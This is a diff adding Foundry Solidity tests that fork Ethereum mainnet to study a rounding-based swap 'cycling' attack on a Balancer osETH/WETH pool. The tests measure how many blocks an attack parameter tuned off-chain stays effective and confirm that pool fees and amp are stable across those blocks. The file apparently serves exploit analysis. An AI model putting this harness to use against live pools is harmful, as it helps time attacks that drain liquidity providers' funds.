+                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                        bW = nW; bO = nO; ok++;
+                    } catch { break; }
+                }
+                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
+            }
+            fwdSafe[i] = firstFail - 1;
+            fwdFailRounds[i] = ffRounds;
+
+            // 4. Backward scan: baseTs - b*12
+            firstFail = LIMIT + 1;
+            ffRounds  = 0;
+            for (uint256 b = 1; b <= LIMIT; b++) {
+                try this.tryWarpToTsAndRefreshSf(baseTs - b * 12) {
+                    // ok
+                } catch { firstFail = b; ffRounds = 0; break; }
+                trickAmt = 1e18 / (sf[1] - 1e18);
+                bW = remains[i]; bO = remains[i]; uint256 ok = 0;
+                for (uint256 r = 0; r < ROUNDS; r++) {
+                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                        bW = nW; bO = nO; ok++;
+                    } catch { break; }
+                }
+                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
+            }
+            bwdSafe[i] = firstFail - 1;
+            bwdFailRounds[i] = ffRounds;
+
+            console.log("block:", blockNums[i], "remain:", remains[i]);
+            console.log("  fwdSafe:", fwdSafe[i], "bwdSafe:", bwdSafe[i]);
+        }
+
+        _printRealForkSummary(blockNums, remains, fwdSafe, bwdSafe,
+                               fwdFailRounds, bwdFailRounds,
+                               baseSf1, baseTimestamps, baselinePassed, LIMIT);
+    }
+
+    /// @notice Diagnostic: for each of the 11 sample blocks used in
+    /// `test_realForkSafeRunDistribution`, fork at N-400, N, N+400 and read
+    /// `(amp, isUpdating, precision)` and `swapFeePercentage`. Confirms that
+    /// the values frozen at N (which the per-N scan loop reuses across the
+    /// ±400-block warp window) are equal to the on-chain values at the scan
+    /// boundaries — i.e. neither amp ramping nor a governance fee change
+    /// occurred inside the scan window.
+    function test_diag_ampAndFeeStability() public {
+        uint256[11] memory blockNums;
+        blockNums[0]  = 23717396;
+        blockNums[1]  = 23717196;
+        blockNums[2]  = 23715196;
+        blockNums[3]  = 23710196;
+        blockNums[4]  = 23703000;
+        blockNums[5]  = 23695800;
+        blockNums[6]  = 23681400;
+        blockNums[7]  = 23667000;
+        blockNums[8]  = 23616600;
+        blockNums[9]  = 23566200;
+        blockNums[10] = 23501400;
+
+        uint256 SCAN = 400;
+        uint256 driftCount = 0;
+        uint256 updatingCount = 0;
+        uint256 feeDriftCount = 0;
+
+        for (uint256 i = 0; i < 11; i++) {
+            uint256 N = blockNums[i];
+
+            vm.createSelectFork("ETH", N - SCAN);
+            (uint256 ampLo, bool updLo,) = OSETH_BPT.getAmplificationParameter();
+            uint256 feeLo = OSETH_BPT.getSwapFeePercentage();
+
+            vm.createSelectFork("ETH", N);
+            (uint256 ampMid, bool updMid,) = OSETH_BPT.getAmplificationParameter();
+            uint256 feeMid = OSETH_BPT.getSwapFeePercentage();
+
+            vm.createSelectFork("ETH", N + SCAN);
+            (uint256 ampHi, bool updHi,) = OSETH_BPT.getAmplificationParameter();
+            uint256 feeHi = OSETH_BPT.getSwapFeePercentage();
+
+            console.log("=== block:", N);
+            console.log("  amp @ N-400 :", ampLo);
+            console.log("  amp @ N     :", ampMid);
+            console.log("  amp @ N+400 :", ampHi);
+            console.log("  isUpdating  : lo/mid/hi =");
+            console.log("    ", updLo);
+            console.log("    ", updMid);
+            console.log("    ", updHi);
+            console.log("  swapFee @ N-400 :", feeLo);
+            console.log("  swapFee @ N     :", feeMid);
+            console.log("  swapFee @ N+400 :", feeHi);
+
+            if (ampLo != ampMid || ampMid != ampHi) {
+                console.log("  *** AMP DRIFT in scan window ***");
+                driftCount++;
+            }
+            if (updLo || updMid || updHi) {
+                console.log("  *** AMP isUpdating==true at some boundary ***");
+                updatingCount++;
+            }
+            if (feeLo != feeMid || feeMid != feeHi) {
+                console.log("  *** SWAP FEE DRIFT in scan window ***");
+                feeDriftCount++;
+            }
+        }
+
+        console.log("");
+        console.log("=== Summary across 11 blocks ===");
+        console.log("  blocks with amp drift     :", driftCount);
+        console.log("  blocks with isUpdating==t :", updatingCount);
+        console.log("  blocks with fee drift     :", feeDriftCount);
+    }
+
+    /// @notice Helper for `test_cyclingIndependentOfPoolState`: run cycling with the
+    /// given `sf1Value` (overrides sf[1] regardless of which fork we're on) and
+    /// return how many of `ROUNDS` rounds passed before the first failure.
+    function _cyclingRoundsAt(uint256 REMAIN, uint256 ROUNDS, uint256 sf1Value)
+        internal returns (uint256 ok)
+    {
+        sf[1] = sf1Value;
+        uint256 t = 1e18 / (sf[1] - 1e18);
+        uint256 bw = REMAIN; uint256 bo = REMAIN;
+        for (uint256 r = 0; r < ROUNDS; r++) {
+            try this.simulateOneRound(bw, bo, t) returns (uint256 nW, uint256 nO) {
+                bw = nW; bo = nO; ok++;
+            } catch { return ok; }
+        }
+    }
+
+    /// @notice Verify Phase 2 cycling is independent of real pool balances/BPT supply.
+    /// Strategy:
+    ///   1. Confirm realWETH / realOSETH / totalBPT differ between two blocks A and B.
+    ///   2. Capture sf[1]_A at block A, run 30-round cycling -> trajectory_A.
+    ///   3. Fork at B (different pool state), force sf[1] := sf[1]_A
+    ///      (amp / swapFee already proven constant by `test_diag_ampAndFeeStability`),
+    ///      run cycling with same REMAIN -> trajectory_B.
+    ///   4. If trajectory_A == trajectory_B byte-for-byte AND a synthetic sf[1] sweep
+    ///      yields identical pass/fail at A and B, cycling is provably independent of
+    ///      real pool balances/BPT supply.
+    function test_cyclingIndependentOfPoolState() public {
+        uint256 BLOCK_A = 23717396;
+        uint256 BLOCK_B = 23501400;
+        uint256 REMAIN  = 67000;
+        uint256 ROUNDS  = 30;
+
+        // ----- Step 1: read pool state at A -----
+        uint256 sf1_A; uint256 ampA; uint256 feeA;
+        uint256 wA; uint256 oA; uint256 sA;
+        {
+            vm.createSelectFork("ETH", BLOCK_A);
+            swapMath = new SwapMath(); _refreshAtCurrentFork();
+            sf1_A = sf[1]; ampA = amp; feeA = swapFeePercentage;
+            (, uint256[] memory bal,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+            wA = bal[0]; oA = bal[2]; sA = OSETH_BPT.getActualSupply();
+        }
+
+        // ----- Step 2: read pool state at B and verify it differs -----
+        uint256 wB; uint256 oB; uint256 sB; uint256 sf1_B;
+        {
+            vm.createSelectFork("ETH", BLOCK_B);
+            swapMath = new SwapMath(); _refreshAtCurrentFork();
+            sf1_B = sf[1];
+            (, uint256[] memory bal,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+            wB = bal[0]; oB = bal[2]; sB = OSETH_BPT.getActualSupply();
+            require(amp == ampA, "amp differs between A and B");
+            require(swapFeePercentage == feeA, "swapFee differs between A and B");
+        }
+
+        console.log("=== Pool state ===");
+        console.log("Block A:", BLOCK_A);
+        console.log("  realWETH :", wA);
+        console.log("  realOSETH:", oA);
+        console.log("  totalBPT :", sA);
+        console.log("  sf[1]    :", sf1_A);
+        console.log("Block B:", BLOCK_B);
+        console.log("  realWETH :", wB);
+        console.log("  realOSETH:", oB);
+        console.log("  totalBPT :", sB);
+        console.log("  sf[1]    :", sf1_B);
+        require(wA != wB, "realWETH equal between blocks");
+        require(oA != oB, "realOSETH equal between blocks");
+        require(sA != sB, "totalBPT equal between blocks");
+        console.log("OK: realWETH / realOSETH / totalBPT all differ between A and B");
+
+        // ----- Step 3: trajectory at A with natural sf[1]_A -----
+        uint256[31] memory bWa; uint256[31] memory bOa; uint256 okA;
+        {
+            vm.createSelectFork("ETH", BLOCK_A);
+            swapMath = new SwapMath(); _refreshAtCurrentFork();
+            require(sf[1] == sf1_A, "A sf[1] inconsistent");
+            uint256 t = 1e18 / (sf[1] - 1e18);
+            bWa[0] = REMAIN; bOa[0] = REMAIN;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bWa[r], bOa[r], t) returns (uint256 nW, uint256 nO) {
+                    bWa[r+1] = nW; bOa[r+1] = nO; okA++;
+                } catch { break; }
+            }
+        }
+
+        // ----- Step 4: trajectory at B with sf[1] forced to sf1_A -----
+        uint256[31] memory bWb; uint256[31] memory bOb; uint256 okB;
+        {
+            vm.createSelectFork("ETH", BLOCK_B);
+            swapMath = new SwapMath(); _refreshAtCurrentFork();
+            require(amp == ampA && swapFeePercentage == feeA, "B amp/fee drifted");
+            sf[1] = sf1_A; // force equality with A
+            uint256 t = 1e18 / (sf[1] - 1e18);
+            bWb[0] = REMAIN; bOb[0] = REMAIN;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bWb[r], bOb[r], t) returns (uint256 nW, uint256 nO) {
+                    bWb[r+1] = nW; bOb[r+1] = nO; okB++;
+                } catch { break; }
+            }
+        }
+
+        // ----- Step 5: compare trajectories byte-for-byte -----
+        console.log("");
+        console.log("=== Trajectory comparison (REMAIN=67000, sf[1] forced to sf1_A) ===");
+        console.log("rounds passed at A:", okA);
+        console.log("rounds passed at B:", okB);
+        uint256 mismatches = 0;
+        {
+            uint256 maxR = okA > okB ? okA : okB;
+            for (uint256 r = 0; r <= maxR; r++) {
+                if (bWa[r] != bWb[r] || bOa[r] != bOb[r]) {
+                    console.log("MISMATCH at round:", r);
+                    console.log("  A.bW :", bWa[r]);
+                    console.log("  B.bW :", bWb[r]);
+                    console.log("  A.bO :", bOa[r]);
+                    console.log("  B.bO :", bOb[r]);
+                    mismatches++;
+                }
+            }
+        }
+        if (okA == okB && mismatches == 0) {
+            console.log("PASS: trajectories byte-identical");
+        } else {
+            console.log("FAIL: trajectories differ");
+        }
+
+        // ----- Step 6: synthetic sf[1] sweep — verify pass/fail count is identical
+        // for many sf[1] values whether we're on fork A or fork B. Uses a fixed delta
+        // (~1e10 wei per "synthetic block", same order as the real osETH rate provider).
+        uint256 LIMIT = 400;
+        uint256 DELTA = 1e10;
+
+        // sweep at A
+        vm.createSelectFork("ETH", BLOCK_A);
+        swapMath = new SwapMath(); _refreshAtCurrentFork();
+        uint256 fwdA = LIMIT; uint256 fwdAR = ROUNDS;
+        for (uint256 b = 1; b <= LIMIT; b++) {
+            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A + b * DELTA);
+            if (ok < ROUNDS) { fwdA = b - 1; fwdAR = ok; break; }
+        }
+        uint256 bwdA = LIMIT; uint256 bwdAR = ROUNDS;
+        for (uint256 b = 1; b <= LIMIT; b++) {
+            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A - b * DELTA);
+            if (ok < ROUNDS) { bwdA = b - 1; bwdAR = ok; break; }
+        }
+
+        // sweep at B
+        vm.createSelectFork("ETH", BLOCK_B);
+        swapMath = new SwapMath(); _refreshAtCurrentFork();
+        require(amp == ampA && swapFeePercentage == feeA, "B amp/fee drifted (sweep)");
+        uint256 fwdB = LIMIT; uint256 fwdBR = ROUNDS;
+        for (uint256 b = 1; b <= LIMIT; b++) {
+            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A + b * DELTA);
+            if (ok < ROUNDS) { fwdB = b - 1; fwdBR = ok; break; }
+        }
+        uint256 bwdB = LIMIT; uint256 bwdBR = ROUNDS;
+        for (uint256 b = 1; b <= LIMIT; b++) {
+            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A - b * DELTA);
+            if (ok < ROUNDS) { bwdB = b - 1; bwdBR = ok; break; }
+        }
+
+        console.log("");
+        console.log("=== Synthetic sf[1] sweep (DELTA=1e10 per step) ===");
+        console.log("fwdSafe A:", fwdA, "fwdFailRounds:", fwdAR);
+        console.log("fwdSafe B:", fwdB, "fwdFailRounds:", fwdBR);
+        console.log("bwdSafe A:", bwdA, "bwdFailRounds:", bwdAR);
+        console.log("bwdSafe B:", bwdB, "bwdFailRounds:", bwdBR);
+        if (fwdA == fwdB && bwdA == bwdB && fwdAR == fwdBR && bwdAR == bwdBR) {
+            console.log("PASS: synthetic sweep produced identical safeRun on A and B");
+        } else {
+            console.log("FAIL: sweep numbers differ");
+        }
+    }
+
+    /// @notice Validate a single off-chain-tuned `remain` value's future safety window.
+    /// Workflow it supports:
+    ///   1. Off-chain optimization at the current head block produced REMAIN = R*.
+    ///   2. We want to know: for how many consecutive future blocks (N, N+1, ..., N+K)
+    ///      will Phase 2 cycling with REMAIN = R* still pass all 30 rounds?
+    /// Method:
+    ///   - Fork at the current block (done in setUp at 23717396, ts=1762156007).
+    ///   - b=0 baseline: run cycling at the current sf[1].
+    ///   - Forward scan: for b = 1..LIMIT, vm.warp(baseTs + b*12), refresh sf[1] from
+    ///     the rate provider's natural linear extrapolation (same method used by the
+    ///     real attack tx and by test_realForkSafeRunDistribution), then run cycling.
+    ///   - Report fwdSafe (blocks) and the rounds achieved at the first failing block.
+    /// Note: amp / swapFee assumed constant in the scan window
+    /// (proven by test_diag_ampAndFeeStability for ranges relevant to this pool).
+    function test_validateRemainFutureWindow() public {
+        uint256 REMAIN = 67000;
+        uint256 ROUNDS = 30;
+        uint256 LIMIT  = 400;
+
+        uint256 baseTs = block.timestamp;
+
+        // b=0 baseline at the head sf[1]
+        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+        uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 baselineOk = 0;
+        for (uint256 r = 0; r < ROUNDS; r++) {
+            try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                bW = nW; bO = nO; baselineOk++;
+            } catch { break; }
+        }
+        console.log("=== validateRemainFutureWindow ===");
+        console.log("REMAIN          :", REMAIN);
+        console.log("baseTs          :", baseTs);
+        console.log("base sf[1]      :", sf[1]);
+        console.log("baseline rounds :", baselineOk);
+        require(baselineOk == ROUNDS, "baseline does not pass 30 rounds");
+
+        // Forward scan: b * 12s into the future (one block per step)
+        uint256 firstFail = LIMIT + 1;
+        uint256 ffRounds  = 0;
+        uint256 ffSf1     = 0;
+        for (uint256 b = 1; b <= LIMIT; b++) {
+            try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
+                // ok
+            } catch { firstFail = b; ffRounds = 0; ffSf1 = 0; break; }
+            trickAmt = 1e18 / (sf[1] - 1e18);
+            bW = REMAIN; bO = REMAIN; uint256 ok = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; ok++;
+                } catch { break; }
+            }
+            if (ok < ROUNDS) { firstFail = b; ffRounds = ok; ffSf1 = sf[1]; break; }
+        }
+
+        uint256 fwdSafe = firstFail - 1;
+        console.log("");
+        console.log("fwdSafe (blocks):", fwdSafe);
+        console.log("fwdSafe (sec)   :", fwdSafe * 12);
+        if (firstFail <= LIMIT) {
+            console.log("first-fail block offset:", firstFail);
+            console.log("first-fail rounds      :", ffRounds);
+            console.log("first-fail sf[1]       :", ffSf1);
+        } else {
+            console.log("no failure within LIMIT blocks (= ", LIMIT, ")");
+        }
+    }
+
+    /// @notice Focused sweep: at a given block, test multiple `remain` values and
+    /// measure baseline + fwdSafe + bwdSafe for each. Single fork, multiple inner loops.
+    function test_block23501400_remainSweep() public {
+        uint256 BLOCK_NUM = 23717396;
+        uint256[1] memory remainSweep;
+        remainSweep[0] = 94000;
+
+        uint256 LIMIT  = 400;
+        uint256 ROUNDS = 30;
+
+        // Single real fork
+        vm.createSelectFork("ETH", BLOCK_NUM);
+        swapMath = new SwapMath();
+        _refreshAtCurrentFork();
+        uint256 baseTs = block.timestamp;
+        uint256 baseSf1 = sf[1];
+        console.log("=== block.number :", BLOCK_NUM);
+        console.log("    baseTs       :", baseTs);
+        console.log("    baseSf1      :", baseSf1);
+
+        for (uint256 k = 0; k < remainSweep.length; k++) {
+            uint256 REMAIN = remainSweep[k];
+            // refresh at base timestamp before each sweep iteration
+            _warpToTsAndRefreshSf(baseTs);
+            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+
+            // baseline
+            uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; ok0++;
+                } catch { break; }
+            }
+            console.log("--- remain =", REMAIN, "---");
+            console.log("    baseline rounds:", ok0);
+            if (ok0 < ROUNDS) {
+                console.log("    BASELINE_FAIL, skip scans");
+                continue;
+            }
+
+            // forward scan
+            uint256 firstFail = LIMIT + 1;
+            uint256 ffRounds  = 0;
+            for (uint256 b = 1; b <= LIMIT; b++) {
+                try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
+                } catch { firstFail = b; ffRounds = 0; break; }
+                trickAmt = 1e18 / (sf[1] - 1e18);
+                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
+                for (uint256 r = 0; r < ROUNDS; r++) {
+                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                        bW = nW; bO = nO; ok++;
+                    } catch { break; }
+                }
+                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
+            }
+            uint256 fwdSafe = firstFail - 1;
+            uint256 fwdFR   = ffRounds;
+
+            // backward scan
+            firstFail = LIMIT + 1;
+            ffRounds  = 0;
+            for (uint256 b = 1; b <= LIMIT; b++) {
+                try this.tryWarpToTsAndRefreshSf(baseTs - b * 12) {
+                } catch { firstFail = b; ffRounds = 0; break; }
+                trickAmt = 1e18 / (sf[1] - 1e18);
+                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
+                for (uint256 r = 0; r < ROUNDS; r++) {
+                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                        bW = nW; bO = nO; ok++;
+                    } catch { break; }
+                }
+                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
+            }
+            uint256 bwdSafe = firstFail - 1;
+            uint256 bwdFR   = ffRounds;
+
+            uint256 total = fwdSafe + bwdSafe + 1;
+            console.log("    fwdSafe(blocks):", fwdSafe, "fwdFail rounds:", fwdFR);
+            console.log("    bwdSafe(blocks):", bwdSafe, "bwdFail rounds:", bwdFR);
+            console.log("    total safe (blocks):", total);
+            console.log("    total safe (min)   :", total * 12 / 60);
+        }
+    }
+
+    /// @dev Helper to keep test_realForkSafeRunDistribution under stack/line limits.
+    function _printRealForkSummary(
+        uint256[11] memory blockNums,
+        uint256[11] memory remains,
+        uint256[11] memory fwdSafe,
+        uint256[11] memory bwdSafe,
+        uint256[11] memory fwdFailRounds,
+        uint256[11] memory bwdFailRounds,
+        uint256[11] memory baseSf1,
+        uint256[11] memory baseTimestamps,
+        bool[11]    memory baselinePassed,
+        uint256 LIMIT
+    ) internal pure {
+        console.log("");
+        console.log("=== Per-N detail (fwd / bwd / total) ===");
+        for (uint256 i = 0; i < 11; i++) {
+            console.log("block.number   :", blockNums[i]);
+            console.log("  remain       :", remains[i]);
+            console.log("  baseTs       :", baseTimestamps[i]);
+            console.log("  baseSf1      :", baseSf1[i]);
+            if (!baselinePassed[i]) {
+                console.log("  BASELINE_FAIL");
+                continue;
+            }
+            // forward
+            if (fwdSafe[i] >= LIMIT) {
+                console.log("  fwdSafe(blocks): >=", LIMIT);
+            } else {
+                console.log("  fwdSafe(blocks):", fwdSafe[i]);
+                console.log("  fwdFail rounds :", fwdFailRounds[i]);
+            }
+            // backward
+            if (bwdSafe[i] >= LIMIT) {
+                console.log("  bwdSafe(blocks): >=", LIMIT);
+            } else {
+                console.log("  bwdSafe(blocks):", bwdSafe[i]);
+                console.log("  bwdFail rounds :", bwdFailRounds[i]);
+            }
+            // total
+            uint256 total = fwdSafe[i] + bwdSafe[i] + 1; // +1 for N itself
+            console.log("  total safe(blocks):", total);
+            console.log("  total safe(min)   :", total * 12 / 60);
+        }
+
+        // aggregate
+        uint256 minTotal = type(uint256).max;
+        uint256 maxTotal = 0;
+        uint256 sumTotal = 0;
+        uint256 cnt = 0;
+        for (uint256 i = 0; i < 11; i++) {
+            if (!baselinePassed[i]) continue;
+            uint256 v = fwdSafe[i] + bwdSafe[i] + 1;
+            if (v < minTotal) minTotal = v;
+            if (v > maxTotal) maxTotal = v;
+            sumTotal += v;
+            cnt++;
+        }
+        console.log("");
+        console.log("=== Summary across passing baselines ===");
+        console.log("baseline pass count   :", cnt);
+        if (cnt > 0) {
+            console.log("min totalSafe(blocks):", minTotal);
+            console.log("max totalSafe(blocks):", maxTotal);
+            console.log("avg totalSafe(blocks):", sumTotal / cnt);
+            console.log("avg totalSafe(min)   :", (sumTotal / cnt) * 12 / 60);
+        }
+    }
+
+    /// @notice Maximum continuous safe run starting at block N.
+    /// 1. Fork ONCE at block N.
+    /// 2. Confirm baseline (offset=0) passes 30 rounds.
+    /// 3. Scan offset = 1, 2, 3, ... blocks (12s each); stop at first failing offset.
+    /// 4. Report (lastSafeBlocks, firstFailBlocks).
+    function test_epochMaxContinuousSafeRun() public {
+        uint256 LIMIT_BLOCKS = 1800;    // up to 6h
+        uint256 ROUNDS       = 30;
+        uint256 REMAIN       = 67000;
+
+        // single fork — all subsequent offsets are vm.warp + updateTokenRateCache
+        _setupEpochOffset(0);
+        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+        uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
+        for (uint256 r = 0; r < ROUNDS; r++) {
+            try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                bW = nW; bO = nO; ok0++;
+            } catch { break; }
+        }
+        console.log("baseline N (offset=0) sf[osETH]:", sf[1]);
+        console.log("baseline N rounds completed   :", ok0);
+        require(ok0 == ROUNDS, "baseline N does NOT pass; cannot measure safe run");
+
+        uint256 firstFailBlocks = type(uint256).max;
+        for (uint256 b = 1; b <= LIMIT_BLOCKS; b++) {
+            _warpAndRefreshSf(b);
+            trickAmt = 1e18 / (sf[1] - 1e18);
+            bW = REMAIN; bO = REMAIN; uint256 ok = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; ok++;
+                } catch { break; }
+            }
+            if (b % 50 == 0) {
+                console.log("  scan +blocks:", b, "rounds:", ok);
+            }
+            if (ok < ROUNDS) {
+                firstFailBlocks = b;
+                console.log("FIRST FAIL at +blocks:", b);
+                console.log("                +sec  :", b * 12);
+                console.log("           sf[osETH]  :", sf[1]);
+                console.log("           rounds done:", ok);
+                break;
+            }
+        }
+
+        if (firstFailBlocks == type(uint256).max) {
+            console.log("=== RESULT ===");
+            console.log("No failure within LIMIT (blocks):", LIMIT_BLOCKS);
+            console.log("Max safe run >= (blocks):", LIMIT_BLOCKS);
+        } else {
+            uint256 lastSafe = firstFailBlocks - 1;
+            console.log("=== RESULT ===");
+            console.log("Max continuous safe run (blocks):", lastSafe);
+            console.log("                          (sec):", lastSafe * 12);
+            console.log("                          (min):", lastSafe * 12 / 60);
+            console.log("First failing block offset      :", firstFailBlocks);
+        }
+    }
+
+    /// @notice Fine-grained scan over a single 12h Keeper epoch starting at block N.
+    /// For each offset (every 30 min = 150 blocks) within [N, N+12h], run cycling with
+    /// remain=67000 / N=30 and record how many rounds Swap 3 successfully completes.
+    /// Purpose: empirically test the universal claim
+    /// "off-chain pass at block N ⇒ on-chain pass at every block in [N, N+12h]".
+    function test_epochFineScan_12h() public {
+        uint256 STEP_BLOCKS = 150;          // 30 min
+        uint256 LAST_BLOCKS  = 3600;         // 12 h
+        uint256 N_POINTS     = LAST_BLOCKS / STEP_BLOCKS + 1; // 25 points
+        uint256 ROUNDS       = 30;
+        uint256 REMAIN       = 67000;
+
+        uint256 passCount = 0;
+        uint256 failCount = 0;
+        uint256 firstFailOffsetBlocks = type(uint256).max;
+
+        console.log("=== 12h epoch fine scan (every 30 min, 25 checkpoints) ===");
+        for (uint256 k = 0; k < N_POINTS; k++) {
+            uint256 offsetBlocks = k * STEP_BLOCKS;
+            _setupEpochOffset(offsetBlocks);
+            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+
+            uint256 bW = REMAIN;
+            uint256 bO = REMAIN;
+            uint256 rounds = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; rounds++;
+                } catch { break; }
+            }
+
+            uint256 minutesOffset = offsetBlocks * 12 / 60; // minutes since N
+            console.log("  +min:", minutesOffset, "rounds:", rounds);
+            if (rounds == ROUNDS) {
+                passCount++;
+            } else {
+                failCount++;
+                if (offsetBlocks < firstFailOffsetBlocks) firstFailOffsetBlocks = offsetBlocks;
+            }
+        }
+        console.log("=== Summary ===");
+        console.log("  pass:", passCount, "/", N_POINTS);
+        console.log("  fail:", failCount);
+        if (failCount > 0) {
+            console.log("  first failing offset (blocks):", firstFailOffsetBlocks);
+            console.log("  first failing offset (min)   :", firstFailOffsetBlocks * 12 / 60);
+        }
+    }
 }
 
